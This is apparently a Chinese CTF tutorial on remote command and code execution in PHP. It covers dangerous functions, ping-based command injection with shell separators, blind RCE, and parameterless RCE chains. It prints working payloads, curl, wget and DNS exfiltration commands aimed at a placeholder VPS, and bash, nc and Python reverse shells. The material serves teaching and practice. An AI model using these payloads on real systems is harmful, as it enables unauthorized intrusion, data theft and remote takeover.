---

title: RCE
date: 2026-07-15
categories: [web安全, 常见漏洞]
recommend: 99
type: tech
---




# 1. RCE

RCE（远程命令/代码执行）是漏洞利用的终点——让服务器执行你写的命令。拿到RCE基本等于拿到了flag。

> 后续的绕过技巧需要区分是属于远程命令执行，还是远程代码执行。

## 1.1 RCE 前置知识

RCE 可以理解为"远程执行"，在 CTF Web 中主要分为两类：

1. **远程命令执行**

   远程命令执行执行的是系统命令，例如 `whoami`、`id`、`ls`、`cat /flag`。这类问题关注的是系统命令本身，以及后端是否把用户输入交给了命令执行函数。

2. **远程代码执行**

   远程代码执行执行的是后端语言代码，例如 PHP 代码、Python 代码、JavaScript 代码或模板表达式。代码执行关注的是语言语法和危险函数调用，如果代码里能调用 `system()`、`exec()` 这类函数，就可以进一步执行系统命令。

两者的 payload 写法不一样：命令执行里通常直接写系统命令，代码执行里通常要写符合对应语言语法的代码。

### 1.1.1 远程命令执行与命令执行函数

远程命令执行指的是用户输入被后端传给系统命令执行函数，最后由服务器调用 Shell 执行系统命令。最简单的例子就是后端直接把 GET 参数交给 `system()`：

```php
system($_GET['cmd']);
```

如果传入：

```bash
?cmd=id
```

服务器实际执行的就是：

```bash
id
```

常见命令执行函数：

1. **有回显**

   这类函数执行命令后，通常会直接把结果输出到页面。

   1. **`system()`**

      `system()` 会执行系统命令，并且通常会直接把结果输出到页面，返回值是命令输出的最后一行。

      ```php
      system("whoami");
      ```

      页面可能输出：

      ```bash
      www-data
      ```

   2. **`passthru()`**

      `passthru()` 和 `system()` 类似，也会直接输出命令结果，更常用于输出原始数据，比如二进制内容。

      ```php
      passthru("id");
      ```

2. **不直接回显**

   这类函数会执行命令，但结果不会自动显示在页面上，通常需要 `echo`、变量接收或者读取管道。

   1. **`exec()`**

      `exec()` 会执行系统命令，但默认不会直接输出完整结果，它通常只返回命令输出的最后一行。

      ```php
      echo exec("whoami");
      ```

      如果写成这样：

      ```php
      exec("whoami");
      ```

      命令仍然可能执行了，但页面不会显示结果。

      ```php
      exec("ls", $out);
      print_r($out);
      ```

   2. **`shell_exec()`**

      `shell_exec()` 会执行命令，并把完整输出作为字符串返回，但它不会自动输出，所以通常需要配合 `echo`。

      ```php
      echo shell_exec("ls");
      ```

   3. **反引号**

      PHP 中的反引号也可以执行系统命令，效果类似 `shell_exec()`，返回的是命令执行结果字符串。

      ```php
      echo `whoami`;
      ```

   4. **`popen()`**

      `popen()` 会打开一个进程管道，需要像读文件一样读取命令输出。

      ```php
      $fp = popen("id", "r");
      echo fread($fp, 1024);
      ```

   5. **`proc_open()`**

      `proc_open()` 可以创建进程并控制标准输入、标准输出、标准错误，比 `popen()` 更底层。

      ```php
      proc_open("id", [], $pipes);
      ```

命令执行函数常见注意点：

1. `system()`、`passthru()` 通常会直接回显。
2. `exec()`、`shell_exec()`、反引号经常需要 `echo` 才能看到结果。
3. `disable_functions` 可能禁用 `system`、`exec`、`shell_exec`、`passthru` 等函数。
4. 一个命令执行函数被禁用时，可以尝试换同类函数，比如 `passthru()`、反引号、`popen()`。
5. Linux 和 Windows 命令不同，Linux 常见 `ls`、`cat`，Windows 常见 `dir`、`type`。

### 1.1.2 远程代码执行与代码执行函数

远程代码执行指的是用户输入被后端当成代码执行，而不是当成普通字符串处理。代码执行和命令执行最大的区别是：命令执行里可以直接写 `id`、`cat /flag`，代码执行里通常要写符合语言语法的代码，例如 PHP 中要写 `system("id");` 或 `echo shell_exec("cat /flag");`。

例如：

```php
eval($_GET['code']);
```

传入：

```php
phpinfo();
```

服务器会执行 PHP 代码，显示 PHP 配置信息。

常见代码执行函数或结构：

1. **`eval()`**

   `eval()` 用来执行 PHP 代码，但它不是普通函数，而是 PHP 的语言结构。传给 `eval()` 的内容必须是合法 PHP 代码，不需要写 `<?php` 开始标签，普通语句通常要用分号 `;` 结尾。

   ```php
   eval($_GET['a']);
   ```

   可以传：

   ```php
   ?a=phpinfo();
   ?a=system('id');
   ```

   常见坑点：

   1. `eval("phpinfo();")` 可以执行。
   2. `eval("<?php phpinfo();")` 一般会报错，因为 `eval()` 里不需要 PHP 开始标签。
   3. `eval("system('id');")` 结尾要带分号，因为传进去的是 PHP 语句。
   4. `eval("id")` 不是合法 PHP 代码，不能当系统命令执行。
   5. `eval()` 不会自动输出普通表达式结果，想看到内容需要 `echo` 或调用有回显的函数。
   6. `eval()` 是语言结构，不是普通函数，所以不能通过变量函数方式调用。

      ```php
      $a = 'eval';
      $a('phpinfo();');
      ```

   7. `eval()` 也不能直接用 `call_user_func()` 调用。

      ```php
      call_user_func('eval', 'phpinfo();');
      ```

2. **`assert()`**

   PHP 8.0 之前，`assert()` 的字符串参数会被当作 PHP 代码求值；该行为从 PHP 7.2 起弃用，PHP 8.0 起移除。是否真正执行还取决于 `zend.assertions`、`assert.active` 等配置。

   ```php
   assert($_GET['a']);
   ```

   PHP 8 之前且断言已启用的环境中可能传：

   ```php
   ?a=system('id');
   ```

   常见坑点：

   1. `assert()` 的字符串代码执行强依赖 PHP 版本。
   2. PHP 8 中，`assert()` 不再把字符串当 PHP 代码执行。
   3. 有些环境会关闭 assert 或调整相关配置，导致 payload 不执行。
   4. 写命令执行调用时建议写成 `system('id');`，不要省略结尾分号。

3. **`create_function()`**

   `create_function()` 会通过字符串动态创建函数，内部会对拼出来的函数代码进行执行。它在 PHP 7.2 开始弃用，PHP 8 中已经移除，所以主要出现在老题或旧环境里。

   ```php
   create_function('', $_GET['code']);
   ```

   典型 payload：

   ```php
   ?code=};system('whoami');//
   ```

   可以近似理解为后端内部拼出了这样的结构：

   ```php
   function __lambda_func() { };system('whoami');// }
   ```

   这个 payload 为什么要这样写：

   1. `}` 用来提前闭合原本的函数体。
   2. `;` 用来结束前面的语句。
   3. `system('whoami');` 是真正要执行的命令，结尾要带分号。
   4. `//` 用来注释掉后面原本多出来的代码，避免语法错误。

   常见坑点：

   1. `create_function()` 不是简单地把传入内容直接执行，而是把内容拼进函数结构里。
   2. 如果只传 `system('whoami');`，通常只是把它放进函数体，是否执行还要看后面有没有调用这个函数。
   3. `};system('whoami');//` 的核心是"闭合函数体 + 执行命令 + 注释残余代码"。
   4. 这个点强依赖旧版本 PHP，新版本 PHP 已经不能使用 `create_function()`。

4. **`preg_replace()` 的 `/e` 模式**

   > `preg_replace(匹配规则, 替换内容, 原字符串)` 
   > 第一个参数是正则匹配规则，第二个参数是替换后的内容，第三个参数是被处理的原字符串。

   `preg_replace()` 本身是 PHP 的正则替换函数，正常情况下只是把匹配到的内容替换成指定字符串。危险点在旧版本 PHP 的 `/e` 修饰符：如果正则规则中带了 `/e`，替换内容会被当作 PHP 代码执行。

   ```php
   preg_replace('/.*/e', $_GET['code'], 'x');
   ```

   老环境中可能传：

   ```php
   ?code=system('id')
   ```

   这里可以理解为：`/.*/e` 先匹配字符串 `x`，然后把 `$_GET['code']` 作为替换内容；因为正则带了 `/e`，所以替换内容不会只被当成普通字符串，而是会被当成 PHP 代码执行。

   常见坑点：

   1. `/e` 模式只存在于旧版本 PHP，新版本会报错或不可用。
   2. `preg_replace()` 本身不是代码执行函数，危险点在 `/e` 修饰符。
   3. 替换结果会被当成 PHP 代码执行，所以 payload 要符合 PHP 语法。
   4. 这类题目通常是老环境或专门出的历史特性题。

5. **`call_user_func()`**

   `call_user_func()` 本身是动态调用函数，不一定危险；但如果函数名和参数都可控，就可以调用危险函数。

   ```php
   call_user_func($_GET['f'], $_GET['a']);
   ```

   传参：

   ```php
   ?f=system&a=id
   ```

   实际效果类似：

   ```php
   system("id");
   ```

   常见坑点：

   1. 只有函数名可控还不一定够，参数也要能传进去才好利用。
   2. `eval` 不是普通函数，不能像 `system` 一样直接用 `call_user_func("eval", "...")` 调用。
   3. 如果过滤了 `system`，还可以考虑 `passthru`、`shell_exec` 等同类函数。

6. **`call_user_func_array()`**

   `call_user_func_array()` 和 `call_user_func()` 类似，只是参数通过数组传入。如果函数名可控、参数数组也可控，也可能变成命令执行或代码执行。

   ```php
   call_user_func_array($_GET['f'], [$_GET['a']]);
   ```

   传参：

   ```php
   ?f=system&a=whoami
   ```

   常见坑点：

   1. 第二个参数必须是数组，所以利用时要关注参数数组是否可控。
   2. 如果数组里只有一个参数，就适合调用 `system("id")` 这种单参数函数。
   3. 如果目标函数需要多个参数，就要看是否能控制数组里的多个值。

代码执行函数常见注意点：

1. 代码执行要求 payload 符合对应语言语法。
2. PHP 代码执行里不能直接写 `cat /flag`，要写成 `system("cat /flag");`。
3. PHP 代码语句通常需要用分号 `;` 结尾，尤其是传给 `eval()`、`create_function()` 这类位置时不要省略。
4. `eval()` 是语言结构，不是普通函数，有些函数调用或过滤场景里不能把它当普通函数处理。
5. `assert()`、`create_function()`、`preg_replace /e` 都和 PHP 版本强相关。
6. 代码执行不一定有回显，没有回显时要主动 `echo`，或者调用有回显的函数。

### 1.1.3 远程命令执行和远程代码执行的区别

| 对比点       | 远程命令执行                      | 远程代码执行                         |
| ------------ | --------------------------------- | ------------------------------------ |
| 执行内容     | 系统命令                          | 后端语言代码                         |
| 常见 payload | `id`、`whoami`、`ls`、`cat /flag` | `phpinfo();`、`system("id");`        |
| 语法要求     | 符合系统命令语法                  | 符合对应语言语法                     |
| 回显方式     | 看命令执行函数是否输出            | 看代码里是否 `echo` 或调用有回显函数 |
| 利用重点     | 命令本身、命令拼接、过滤绕过      | 语言语法、函数调用、版本特性         |

简单来说：

1. 如果传 `id`、`whoami` 能执行，通常是命令执行。
2. 如果传 `system("id");`、`phpinfo();` 才能执行，通常是代码执行。
3. 如果代码执行里能调用 `system()`、`exec()`，就可以进一步执行系统命令。
4. 做题时不要把 `cat /flag` 直接塞进 `eval()`，因为 `cat /flag` 不是合法 PHP 代码。

### 1.1.4 函数速查表

这张表只用来快速判断函数类型，具体函数行为和坑点看前面的详细说明。

| 函数 / 结构              | 类型         | 回显特点             | 备注                   |
| ------------------------ | ------------ | -------------------- | ---------------------- |
| `system()`               | 命令执行     | 通常直接回显         | 返回最后一行           |
| `passthru()`             | 命令执行     | 直接回显             | 常用于原始输出         |
| `exec()`                 | 命令执行     | 默认不直接完整回显   | 常配合 `echo` 或数组   |
| `shell_exec()`           | 命令执行     | 需要 `echo`          | 返回完整字符串         |
| 反引号                   | 命令执行     | 需要 `echo`          | 类似 `shell_exec()`    |
| `popen()`                | 命令执行     | 需要读取管道         | 像读文件一样读结果     |
| `proc_open()`            | 命令执行     | 需要处理管道         | 可控标准输入输出       |
| `eval()`                 | 代码执行     | 看代码是否输出       | PHP 语言结构           |
| `assert()`               | 代码执行     | 看版本和配置         | PHP 8 不能按老方法利用 |
| `create_function()`      | 代码执行     | 看是否触发注入或调用 | PHP 8 移除             |
| `preg_replace /e`        | 代码执行     | 老版本特性           | 新版本不可用           |
| `call_user_func()`       | 动态函数调用 | 看调用的函数         | 函数名和参数可控时危险 |
| `call_user_func_array()` | 动态函数调用 | 看调用的函数         | 参数数组可控时危险     |

## 1.2 ping 命令注入与命令分隔符

很多 RCE 入门题会给一个 IP 输入框，让用户输入 IP，然后后端调用 `ping` 命令检测主机是否存活。这个场景本身不是漏洞，漏洞点在于后端把用户输入直接拼进了系统命令里。

### 1.2.1 典型场景

例如后端代码是：

```php
system("ping -c 1 " . $_GET['ip']);
```

正常传入：

```bash
?ip=127.0.0.1
```

服务器实际执行：

```bash
ping -c 1 127.0.0.1
```

如果传入：

```bash
?ip=127.0.0.1;id
```

服务器实际执行：

```bash
ping -c 1 127.0.0.1;id
```

这里的 `;` 会把命令分成两段：前面执行 `ping -c 1 127.0.0.1`，后面继续执行 `id`。所以只要能控制拼接进去的内容，就可能从正常的 ping 功能变成命令执行。

### 1.2.2 命令分隔符

命令分隔符的作用是把原本的一条命令拆开，或者让后面的命令在特定条件下执行。Linux 和 Windows 的分隔符不完全一样，做题时要先判断目标环境。

1. **Linux 常见分隔符**

   1. **分号 `;`**

      分号表示前后命令顺序执行，是命令注入里最常见的分隔符。

      ```bash
      127.0.0.1;id
      ```

   2. **逻辑与 `&&`**

      `&&` 表示前面的命令执行成功后，才执行后面的命令。

      ```bash
      127.0.0.1&&id
      ```

   3. **管道 `|`**

      管道会把前面命令的输出交给后面的命令。`id` 这类命令不依赖标准输入，所以很多时候也能看到结果。

      ```bash
      127.0.0.1|id
      ```

   4. **逻辑或 `||`**

      `||` 表示前面的命令执行失败后，才执行后面的命令。注意，`127.0.0.1||id` 通常不适合作为测试 payload，因为前面的 ping 成功时，后面的 `id` 不会执行。

      ```bash
      not_exist||id
      ```

   5. **后台执行 `&`**

      `&` 会让前面的命令进入后台执行，然后继续执行后面的命令。

      ```bash
      127.0.0.1&id
      ```

   6. **换行 `%0a`**

      换行在 Shell 中也可以作为命令分隔。因为 URL 参数里不能直接写真实换行，所以通常用 `%0a` 表示。

      ```bash
      127.0.0.1%0aid
      ```

   7. **反引号**

      反引号属于命令替换，会先执行反引号里的命令，再把执行结果拼回原命令。它不一定直接回显结果，结果可能出现在 ping 的参数或报错信息里。

      ```bash
      127.0.0.1`whoami`
      ```

   8. **`$()`**

      `$()` 也是命令替换，作用和反引号类似，会先执行括号里的命令，再把结果拼回原命令。

      ```bash
      127.0.0.1$(whoami)
      ```

2. **Windows 常见分隔符**

   1. **单个 `&`**

      Windows CMD 中，`&` 表示前后命令顺序执行。

      ```bash
      127.0.0.1&whoami
      ```

   2. **逻辑与 `&&`**

      前面的命令成功后，才执行后面的命令。

      ```bash
      127.0.0.1&&whoami
      ```

   3. **逻辑或 `||`**

      前面的命令失败后，才执行后面的命令。

      ```bash
      not_exist||whoami
      ```

   4. **管道 `|`**

      管道会把前面命令的输出交给后面的命令。

      ```bash
      127.0.0.1|whoami
      ```

### 1.2.3 IP 写法绕过

有些题目会限制输入必须像 IP，或者过滤 `127.0.0.1`、`localhost` 这类关键字，这时可以尝试换一种 IP 表示方式。

1. **IPv4 短写**

   ```bash
   127.1
   ```

   `127.1` 在一些环境中会被解析成 `127.0.0.1`。

2. **十进制整数写法**

   ```bash
   2130706433
   ```

   `2130706433` 是 `127.0.0.1` 对应的十进制整数形式。

3. **单数字 `0` 写法**

   ```bash
   0
   ```

   `0` 在一些环境中会被当作 `0.0.0.0` 处理；访问 `0.0.0.0` 时，有些场景会落到本机服务，所以 CTF 中可以作为本机地址绕过尝试。注意，`0` 不是严格解析成 `localhost` 或 `127.0.0.1`。

4. **十六进制写法**

   ```bash
   0x7f000001
   ```

   `7f000001` 对应的就是 `127.0.0.1`。

5. **八进制写法**

   ```bash
   0177.0.0.1
   ```

   `0177` 是八进制，等于十进制的 `127`。

6. **IPv6 本地地址**

   ```bash
   ::1
   ```

   `::1` 是 IPv6 的本地回环地址。

7. **域名写法**

   ```bash
   localhost
   ```

   `localhost` 会通过域名解析指向本机地址。如果后端只过滤 `127.0.0.1`，但允许域名，就可以尝试这种写法。

### 1.2.4 常见注意点

1. Linux 常见 `ping -c 1`，Windows 常见 `ping -n 1`。
2. 换行一般用 `%0a` 表示，其他编码绕过放到后面的过滤绕过章节。
3. `||` 只有在前一条命令失败时才会执行后面的命令，不要拿成功的 `127.0.0.1||id` 当通用 payload。
4. 反引号和 `$()` 是命令替换，重点是"先执行里面的命令"，结果不一定直接显示。
5. IP 变形写法受后端校验和系统解析方式影响，遇到严格正则、`inet_pton()`、`filter_var()` 这类校验时可能不生效。
6. 如果是直接写在 URL 查询参数里，`&` 可能被当成参数分隔符；这一点后面讲编码绕过时再展开。
7. 这一节只讲 ping 场景、命令分隔符和 IP 写法绕过；读 flag、无回显、外带这些内容放到后面章节。

## 1.3 无回显 RCE

无回显 RCE 指的是命令已经在服务器上执行，但是页面没有把命令结果显示出来。遇到这种情况时，先不要急着读 flag，要先判断"为什么没有回显"，再选对应的带出方式。

常见原因可以分成几类：

1. **命令执行了，但后端没有输出结果**

   例如用了 `exec()`、`shell_exec()` 但没有 `echo`，或者页面只返回固定文案。

2. **命令结果被重定向丢弃**

   例如后端拼接了 `>/dev/null 2>&1`，把标准输出和标准错误都丢掉。

3. **页面没有回显，但目标可以写文件**

   可以把结果写入 Web 目录，再通过浏览器访问。

4. **页面没有回显，但目标可以出网**

   可以用 HTTP 或 DNS 把结果带出来。

5. **完全没有直接通道**

   可以用时间盲注一点点判断结果。

### 1.3.1 确认命令是否执行

无回显时，第一步是确认命令有没有执行。最常用的方法是让服务器延时，如果页面响应明显变慢，就说明命令大概率执行了。

1. **Linux 延时**

   ```bash
   ?cmd=sleep 5
   ```

   如果页面等待 5 秒左右才返回，说明 `sleep 5` 被执行了。

2. **Windows 延时**

   ```bash
   ?cmd=ping -n 5 127.0.0.1
   ```

   Windows 下可以用 `ping` 自己制造延时。

3. **ping 注入场景**

   如果参数原本会被拼进 `ping` 命令，就把延时命令拼到 IP 后面。

   ```bash
   ?ip=127.0.0.1;sleep 5
   ```

### 1.3.2 后端没有输出结果

这种情况是命令执行了，但页面没有把命令结果输出出来。比如后端用了 `shell_exec()`，但是没有 `echo`：

```php
shell_exec($_GET['cmd']);
```

传入：

```bash
?cmd=id
```

命令可能执行了，但页面没有任何结果。

这种场景通常不能靠简单分隔符解决，因为问题不是"后面的内容影响了输出"，而是程序根本没有把结果返回给页面。常见思路是：

1. **代码执行时主动输出**

   如果能控制的是 PHP 代码，而不是系统命令，可以主动 `echo`。

   ```php
   echo shell_exec("id");
   ```

2. **把结果写入文件**

   ```bash
   ?cmd=id > /var/www/html/out.txt
   ```

3. **通过外带拿结果**

   ```bash
   ?cmd=curl http://你的VPS:8000/$(whoami)
   ```

### 1.3.3 输出被重定向丢弃

这种情况是命令本来可能有回显，但后端额外拼了重定向，把结果丢掉。

例如：

```php
system($_GET['cmd'] . " >/dev/null 2>&1");
```

传入：

```bash
?cmd=id
```

实际执行：

```bash
id >/dev/null 2>&1
```

这里 `>/dev/null 2>&1` 会把标准输出和标准错误都丢弃。

1. **命令分隔类**

   这类方法的目的，是让我们自己的命令先结束，避免后面的重定向影响前一条命令。

   1. **分号 `;`**

      ```bash
      ?cmd=cat /flag;
      ```

      拼接后类似：

      ```bash
      cat /flag; >/dev/null 2>&1
      ```

   2. **换行 `%0a`**

      换行在 Shell 里也能作为命令分隔符。URL 参数里不能直接写真实换行，所以一般用 `%0a`。

      ```bash
      ?cmd=cat /flag%0a
      ```

   3. **后台执行 `&`**

      `&` 会让前面的命令进入后台执行，然后继续执行后面的内容。

      ```bash
      ?cmd=cat /flag&
      ```

      这个方法不如分号稳定，因为命令会进入后台，页面能不能直接看到输出要看具体环境。

   4. **逻辑与 `&&`**

      `&&` 表示前面的命令成功后再执行后面的内容。在某些拼接场景中，也可以让前面的命令先完成。

      ```bash
      ?cmd=cat /flag&&
      ```

      这个方法依赖后面拼接的内容能组成合法命令，不如 `;` 和换行通用。

2. **注释后缀类**

   这类方法的目的，是直接把后端拼接的重定向注释掉。

   ```bash
   ?cmd=cat /flag #
   ```

   拼接后类似：

   ```bash
   cat /flag # >/dev/null 2>&1
   ```

   注意：`#` 前面最好有空格，否则可能会被当成文件名的一部分。

3. **写文件类**

   这类方法的目的，是不依赖页面回显，而是把结果保存到 Web 可访问文件里。

   1. **直接重定向到文件**

      ```bash
      ?cmd=cat /flag > /var/www/html/out.txt #
      ```

      这里最后加 `#` 是为了避免后端继续拼接的 `>/dev/null 2>&1` 覆盖我们的重定向。

   2. **用 `tee` 写文件**

      ```bash
      ?cmd=cat /flag | tee /var/www/html/out.txt #
      ```

### 1.3.4 写入 Web 目录后访问

如果页面没有回显，但当前用户对 Web 目录有写权限，可以把命令结果写到 Web 可访问目录里，再用浏览器访问文件。

1. **写入结果文件**

   ```bash
   ?cmd=cat /flag > /var/www/html/out.txt
   ```

   然后访问：

   ```text
   http://target/out.txt
   ```

2. **复制 flag 文件**

   ```bash
   ?cmd=cp /flag /var/www/html/flag.txt
   ```

3. **用 `tee` 写文件**

   ```bash
   ?cmd=cat /flag | tee /var/www/html/out.txt
   ```

常见 Web 目录可以尝试 `/var/www/html/`、`/var/www/`、`/app/`、当前目录下的 `static/` 或 `public/`。是否能成功取决于路径是否存在、Web 服务是否能访问、当前用户是否有写权限。

### 1.3.5 HTTP 外带

如果目标服务器可以访问外网，可以让它主动请求自己的 VPS，把命令结果放到 URL 里，从访问日志中查看结果。

1. **先在 VPS 上监听 HTTP 请求**

   ```bash
   python3 -m http.server 8000
   ```

2. **用 `curl` 外带短结果**

   ```bash
   ?cmd=curl http://你的VPS:8000/$(whoami)
   ```

3. **用 `curl` 外带 flag**

   ```bash
   ?cmd=curl http://你的VPS:8000/$(cat /flag | base64 -w0)
   ```

   `base64 -w0` 可以把输出压成一行，避免换行影响 URL。

4. **用 `wget` 外带**

   ```bash
   ?cmd=wget http://你的VPS:8000/$(whoami)
   ```

### 1.3.6 DNSLOG 外带

DNS 外带适合 HTTP 出网受限、但 DNS 查询还能出去的情况。思路是把命令结果拼进域名里，让目标服务器发起 DNS 查询，然后在 DNSLOG 平台看到查询记录。

1. **先测试 DNS 是否能出网**

   ```bash
   ?cmd=ping test.你的dnslog域名
   ```

2. **外带短结果**

   ```bash
   ?cmd=ping $(whoami).你的dnslog域名
   ```

3. **外带文件内容**

   DNS 域名只能包含有限字符，不能直接把原始 flag 随便拼进去，建议先转成十六进制。

   ```bash
   ?cmd=ping $(xxd -p -c 30 /flag).你的dnslog域名
   ```

4. **分段外带**

   ```bash
   ?cmd=for i in $(xxd -p -c 30 /flag);do ping $i.你的dnslog域名;done
   ```

拿到十六进制后，可以本地还原：

```bash
echo "十六进制内容" | xxd -r -p
```

### 1.3.7 反弹 Shell

如果目标可以主动连接自己的 VPS，可以尝试反弹 Shell。反弹 Shell 适合已经确认命令执行、目标能出网、并且想要交互操作的情况。

1. **VPS 先监听**

   ```bash
   nc -lvnp 4444
   ```

2. **Bash 反弹**

   ```bash
   ?cmd=bash -c 'bash -i >& /dev/tcp/你的IP/4444 0>&1'
   ```

3. **nc 反弹**

   ```bash
   ?cmd=nc -e /bin/bash 你的IP 4444
   ```

   注意：很多环境里的 `nc` 不支持 `-e`。

4. **Python3 反弹**

   ```bash
   ?cmd=python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("你的IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
   ```

### 1.3.8 时间盲注

如果没有回显、不能写文件、不能出网，也可以用时间盲注一点点判断文件内容。它很慢，但在完全无回显时有用。

1. **判断第一个字符**

   ```bash
   ?cmd=if [ "$(cut -c 1 /flag)" = "f" ];then sleep 5;fi
   ```

2. **判断指定位置字符**

   ```bash
   ?cmd=if [ "$(cut -c 2 /flag)" = "l" ];then sleep 5;fi
   ```

3. **判断是否包含某个字符串**

   ```bash
   ?cmd=if grep -q "flag" /flag;then sleep 5;fi
   ```

时间盲注要注意引号。`"$(cut -c 1 /flag)"` 外面加双引号，是为了避免空字符或特殊字符导致 Shell 判断语法出错。

### 1.3.9 常见注意点

1. 无回显不代表命令没执行，先用 `sleep` 这类延时命令确认。
2. 如果是程序没有输出结果，分隔符不一定有用，要考虑写文件或外带。
3. 如果是输出被重定向丢弃，可以优先尝试 `;`、`%0a`、`#`。
4. 写 Web 目录需要知道路径，并且当前用户要有写权限。
5. HTTP 外带依赖目标能访问你的 VPS，也依赖目标有 `curl`、`wget` 等工具。
6. DNS 外带更适合短数据，长数据要分段，并且建议转成十六进制。
7. 反弹 Shell 依赖目标出网和可用工具，不稳定时不要死磕。
8. 时间盲注最慢，通常作为最后手段。

## 1.4 无参数 RCE

无参数 RCE 常见于 PHP 代码执行题。它不是说所有函数都不能带参数，而是源码限制了普通参数写法，导致不能直接写字符串、变量、数组下标、逗号等内容，只能用无参数函数或嵌套函数调用去构造可用数据。

### 1.4.1 无参数 RCE 的特征

看到下面几类源码限制时，可以优先考虑无参数 RCE。

1. **存在代码执行入口**

   ```php
   eval($_GET['code']);
   ```

   或者老题里常见：

   ```php
   assert($_GET['code']);
   ```

2. **只允许函数名加括号**

   ```php
   /[a-z_]+\((?R)?\)/
   ```

   `(?R)` 表示递归匹配整个正则，所以它可以匹配函数嵌套函数：

   ```php
   phpinfo()
   print_r(scandir(getcwd()))
   ```

   但一般不能直接写：

   ```php
   system("id")
   $_GET['cmd']
   scandir(".")
   ```

3. **允许字母、数字、下划线形式的函数名**

   ```php
   /[^\W]+\((?R)?\)/
   ```

   `[^\W]` 可以粗略理解成 `\w`，也就是字母、数字、下划线。

4. **过滤引号、变量、数组下标、逗号**

   不能写 `"."`、`$_GET['cmd']`、`[0]` 这类内容时，就要考虑用函数返回值间接构造参数。

### 1.4.2 常用函数分类

无参数 RCE 的核心是：不能直接手写参数，就让 PHP 内置函数自己生成参数。下面这些函数不一定每题都能用，主要看源码过滤了什么、PHP 版本是什么、函数有没有被禁用。

1. **生成路径和目录**

   1. `localeconv()`：返回本地化数字格式信息数组，常配合 `current()` 取出 `.`。
   2. `getcwd()`：获取当前工作目录。
   3. `dirname()`：获取上级目录。
   4. `chdir()`：改变当前工作目录。
   5. `scandir()`：读取目录文件名。

2. **取数组和字符串内容**

   1. `current()`：取数组当前元素。
   2. `pos()`：`current()` 的别名。
   3. `end()`：取数组最后一个元素。
   4. `next()`：指针后移一位并取值。
   5. `array_reverse()`：反转数组，常用来取目录排序靠后的文件。
   6. `array_slice()`：截取数组，适合按正数或倒数定位文件。
   7. `array_flip()` / `array_rand()`：常配合随机取文件名。
   8. `strrev()`：反转字符串。

3. **输出和读文件**

   1. `print_r()`：输出数组。
   2. `var_dump()`：输出更详细。
   3. `var_export()`：输出合法 PHP 表示形式。
   4. `show_source()` / `highlight_file()`：读取并高亮 PHP 源码。
   5. `readfile()`：读取普通文件内容。
   6. `file_get_contents()`：读取文件为字符串，通常还要配合输出函数。
   7. `file()`：读取文件为数组，通常还要配合输出函数。

4. **从请求上下文取值**

   1. `getallheaders()`：获取请求头。
   2. `get_defined_vars()`：获取当前作用域变量。
   3. `session_id()`：获取当前 Session ID。

### 1.4.3 构造当前目录参数

```php
// --- 构造当前目录参数 ---
print_r(scandir(getcwd()));
print_r(scandir(current(localeconv())));
print_r(scandir(pos(localeconv())));
print_r(scandir(chr(46)));
```

**可替换点：**

1. `getcwd()` 可以换成 `current(localeconv())`、`pos(localeconv())`、`chr(46)`。

**注意点：**

1. `getcwd()` 是当前工作目录完整路径。
2. `current(localeconv())`、`pos(localeconv())`、`chr(46)` 是构造 `.`。
3. `chr(46)` 需要数字，数字被过滤时不能用。
4. 如果正则严格限制 `/[a-z_]+\((?R)?\)/`，`chr(46)` 这种带数字参数的写法通常不符合。

### 1.4.4 目录扫描

```php
// --- 基础扫描（当前目录） ---
print_r(scandir(getcwd()));
var_dump(scandir(getcwd()));
var_export(scandir(getcwd()));

// --- 进阶扫描（上级目录） ---
print_r(scandir(dirname(getcwd())));                    // 上一级
print_r(scandir(dirname(dirname(getcwd()))));            // 上两级
print_r(scandir(dirname(dirname(dirname(getcwd())))));    // 上三级
```

**可替换点：**

1. `print_r()` 可以换成 `var_dump()` 或 `var_export()`。
2. `getcwd()` 可以按 1.4.3 替换。
3. `dirname(getcwd())` 外面多套一层 `dirname()`，就继续往上跳一级。

**注意点：**

1. 先扫当前目录，再扫上级目录。
2. 如果有 `open_basedir` 限制，上级目录不一定能扫出来。

### 1.4.5 读取目录里的文件

读文件前建议先用 `1.4.4 目录扫描` 看清楚文件顺序。`scandir()` 返回结果里通常包含 `.` 和 `..`，所以正数读取时要注意你实际取到的是哪一项。

```php
// --- 读取最后一个文件 ---
readfile(end(scandir(getcwd())));
readfile(current(array_reverse(scandir(getcwd()))));
show_source(end(scandir(getcwd())));

// --- 读取倒数第几个文件（next 版） ---
readfile(next(array_reverse(scandir(getcwd()))));       // 倒数第 2 个文件
show_source(next(array_reverse(scandir(getcwd()))));    // 倒数第 2 个 PHP 源码

// --- 读取倒数第几个文件（array_slice 版） ---
readfile(current(array_slice(array_reverse(scandir(getcwd())),1)));    // 倒数第 2 个文件
readfile(current(array_slice(array_reverse(scandir(getcwd())),2)));    // 倒数第 3 个文件

// --- 读取正数第几个文件（next 版） ---
readfile(next(scandir(getcwd())));       // 正数第 2 个文件
show_source(next(scandir(getcwd())));    // 正数第 2 个 PHP 源码

// --- 读取正数第几个文件（array_slice 版） ---
readfile(current(array_slice(scandir(getcwd()),2)));    // 正数第 3 个文件
readfile(current(array_slice(scandir(getcwd()),3)));    // 正数第 4 个文件

// --- 读取上级目录里的文件（先切目录） ---
chdir(dirname(getcwd()));readfile(current(array_reverse(scandir(getcwd()))));
chdir(dirname(getcwd()));show_source(current(array_reverse(scandir(getcwd()))));

// --- 随机读取当前目录文件 ---
readfile(array_rand(array_flip(scandir(getcwd()))));
show_source(array_rand(array_flip(scandir(getcwd()))));
```

**可替换点：**

1. `readfile()` 可以换成 `show_source()` 或 `highlight_file()`；读 PHP 源码用 `show_source()` / `highlight_file()`，读普通文本用 `readfile()`。
2. `getcwd()` 可以按 1.4.3 替换。
3. `end(scandir(getcwd()))` 可以换成 `current(array_reverse(scandir(getcwd())))`。
4. `next(array_reverse(scandir(getcwd())))` 可以继续套 `next()`，用来尝试更靠前的倒数文件。
5. `array_slice(...,1)`、`array_slice(...,2)` 里的数字可以调整，用来控制倒数第几个。
6. `array_slice(scandir(getcwd()),2)` 里的 `2` 可以调整，用来控制正数第几个文件。

**注意点：**

1. `scandir()` 返回结果里通常包含 `.` 和 `..`，所以读正数文件时要先看清楚目录顺序。
2. `next(scandir(getcwd()))` 取的是 `scandir()` 返回数组里的下一个元素，通常是正数第 2 个文件。
3. 如果想稳定定位第几个文件，优先用 `array_slice()` 版。
4. `end()`、`next()` 都会移动数组指针，如果环境不稳定，优先用 `current(array_reverse(...))` 或 `array_slice()` 版。
